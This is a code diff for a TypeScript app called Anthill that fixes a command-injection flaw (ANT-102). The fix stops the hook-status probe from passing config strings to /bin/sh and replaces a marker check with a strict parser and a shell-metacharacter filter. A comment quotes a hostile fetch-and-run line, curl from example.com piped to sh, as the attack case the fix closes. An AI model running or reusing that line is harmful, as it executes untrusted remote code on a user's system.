@@ -267,21 +267,37 @@ export class ObservationSetupService {
    */
   private async probeHook(command: string | undefined): Promise<string | undefined> {
     if (!command) return "No Anthill hook command was found in the config file.";
-    // Before running anything: a command that names its interpreter by bare
-    // name is resolved against whatever PATH the *harness* has, which is not
-    // the PATH Anthill has and not one Anthill can see. Such a command can
-    // pass the probe here and still fail every time it actually fires — which
-    // is exactly what happened. It is unverifiable by construction, so it does
-    // not get to be called working.
-    if (pathDependent(command)) {
+
+    /*
+     * Taken apart before anything runs, and run as a program rather than as a
+     * line of shell.
+     *
+     * This used to hand the stored string to `/bin/sh -c`, having decided it
+     * was Anthill's because the marker appeared somewhere in it. Checking
+     * whether observation is set up then ran whatever the config said — a
+     * marker in a trailing comment was enough (ANT-102). What is spawned now
+     * is the executable the entry names, with its arguments as argv, so there
+     * is no shell to interpret anything and nothing to quote.
+     */
+    const parsed = parseHookCommand(command);
+    if (!parsed) {
+      return "This hook entry is not one Anthill recognises, so it was not run. Review it in the config file, then re-enable observation to rewrite Anthill's own entries.";
+    }
+    // A command that names its interpreter by bare name is resolved against
+    // whatever PATH the *harness* has, which is not the PATH Anthill has and
+    // not one Anthill can see. Such a command can pass the probe here and
+    // still fail every time it actually fires — which is exactly what
+    // happened. It is unverifiable by construction, so it does not get to be
+    // called working, and it is not spawned to find out.
+    if (!parsed.runnable) {
       return "The hook command finds its interpreter through PATH, which the harness may not share with Anthill. Re-enable observation to rewrite the entries with an absolute path.";
     }
     const log = join(tmpdir(), `anthill-hook-probe-${process.pid}-${Date.now()}.jsonl`);
     try {
       const outcome = await runProcess({
-        command: "/bin/sh",
-        args: ["-c", command],
-        env: { ANTHILL_LIVE_HOOK_LOG: log },
+        command: parsed.execPath,
+        args: [parsed.handlerPath, OWNER_MARKER, parsed.harness, parsed.event],
+        env: { ELECTRON_RUN_AS_NODE: "1", ANTHILL_LIVE_HOOK_LOG: log },
         stdinPayload: "{}",
         timeoutMs: 10_000,
         ...(this.spawnFn ? { spawnFn: this.spawnFn } : {}),
@@ -467,17 +483,105 @@ function withoutAnthillHooks(
 }
 
 /**
- * Whether a command leaves it to PATH to find its interpreter.
+ * An Anthill hook entry, taken apart into the pieces it is made of.
  *
- * Leading `NAME=value` assignments are the shell's, not the command's; the
- * first token after them is the program. An absolute path is the only form
- * that means the same thing in every environment.
+ * What a hook entry *is* has to be decided structurally, because the answer
+ * decides whether Anthill runs it. It used to be decided by asking whether the
+ * string contained the marker anywhere, and the string was then handed whole
+ * to `/bin/sh -c` — so a line like
+ *
+ *     curl example.com/x.sh | sh   # anthill-observation-hook
+ *
+ * sitting in the user's own Claude or Codex config ran when Anthill merely
+ * *checked* whether observation was set up (ANT-102). Checking a status should
+ * not execute anything the checker did not write.
+ *
+ * A marker in a comment is not ownership. The shape below is: the exact
+ * command `commandFor` writes, and nothing else.
  */
-function pathDependent(command: string): boolean {
-  const tokens = command.trim().split(/\s+/);
-  const program = tokens.find((token) => !/^[A-Za-z_][A-Za-z0-9_]*=/.test(token));
-  if (!program) return true;
-  return !program.replace(/^"/, "").startsWith("/");
+export type ParsedHookCommand = {
+  execPath: string;
+  handlerPath: string;
+  harness: string;
+  event: string;
+  /**
+   * Whether both paths are absolute, which is what makes it runnable.
+   *
+   * Ownership and runnability are two questions and this type answers both,
+   * because they have different consequences. An entry written by an older
+   * Anthill names its interpreter `node` and is still *ours* — the user must
+   * be told it needs repair, not that no entries exist — but it is not one
+   * this app will spawn, because what `node` resolves to depends on a PATH
+   * Anthill cannot see.
+   */
+  runnable: boolean;
+};
+
+/**
+ * Anything that would make a shell do more than run one program.
+ *
+ * Checked before tokenising rather than after: the point is not to understand
+ * these safely, it is to have nothing to do with a string that contains them.
+ */
+const SHELL_METACHARACTERS = /[;|&$`><(){}[\]!*?~\n\r\\#]/;
+
+/**
+ * Split a command the way the writer quoted it: whitespace, and double quotes
+ * around the two absolute paths. Not a shell parser — a reader for one shape.
+ */
+function tokenise(command: string): string[] | undefined {
+  const tokens: string[] = [];
+  let index = 0;
+  while (index < command.length) {
+    while (index < command.length && command[index] === " ") index += 1;
+    if (index >= command.length) break;
+    if (command[index] === '"') {
+      const end = command.indexOf('"', index + 1);
+      if (end === -1) return undefined;
+      tokens.push(command.slice(index + 1, end));
+      index = end + 1;
+      // A quoted token must end the token: `"a"b` is a shell concatenation,
+      // and this reader does not do concatenation.
+      if (index < command.length && command[index] !== " ") return undefined;
+      continue;
+    }
+    const end = command.indexOf(" ", index);
+    const stop = end === -1 ? command.length : end;
+    const token = command.slice(index, stop);
+    if (token.includes('"')) return undefined;
+    tokens.push(token);
+    index = stop;
+  }
+  return tokens;
+}
+
+/**
+ * The pieces of an Anthill hook entry, or nothing when it is not one.
+ *
+ * Nothing here trusts the marker on its own. The marker has to be in the
+ * argument position this app writes it in, after two absolute paths, with the
+ * harness and event after it and nothing else on the line.
+ */
+export function parseHookCommand(command: string): ParsedHookCommand | undefined {
+  if (SHELL_METACHARACTERS.test(command)) return undefined;
+  const tokens = tokenise(command);
+  if (!tokens) return undefined;
+
+  // The one assignment this app writes, and no others: an assignment is a
+  // shell feature, and accepting arbitrary ones would accept a way to change
+  // what the program does without changing its name.
+  const rest = tokens[0] === "ELECTRON_RUN_AS_NODE=1" ? tokens.slice(1) : tokens;
+  if (rest.length !== 5) return undefined;
+
+  const [execPath, handlerPath, marker, harness, event] = rest;
+  // The marker in the position this app writes it in. A marker anywhere else
+  // — a trailing comment, an argument to something else — is somebody's line
+  // that mentions Anthill, not Anthill's line.
+  if (marker !== OWNER_MARKER) return undefined;
+  if (!/^[a-z-]+$/.test(harness) || !/^[A-Za-z]+$/.test(event)) return undefined;
+
+  const runnable = execPath.startsWith("/") && handlerPath.startsWith("/");
+  return { execPath, handlerPath, harness, event, runnable };
 }
 
 /** The commands Anthill's own entries currently carry — what actually fires. */
@@ -486,7 +590,10 @@ function anthillCommands(config: Record<string, unknown>, def: HarnessDefinition
   const out: string[] = [];
   for (const event of def.events) {
     for (const entry of entriesFor(hooks[event])) {
-      if (typeof entry.command === "string" && entry.command.includes(OWNER_MARKER)) {
+      // Ownership is the shape of the command, not a substring of it. An
+      // entry carrying the marker in a comment is somebody else's line that
+      // mentions us, and running it was the bug (ANT-102).
+      if (typeof entry.command === "string" && parseHookCommand(entry.command)) {
         out.push(entry.command);
         continue;
       }
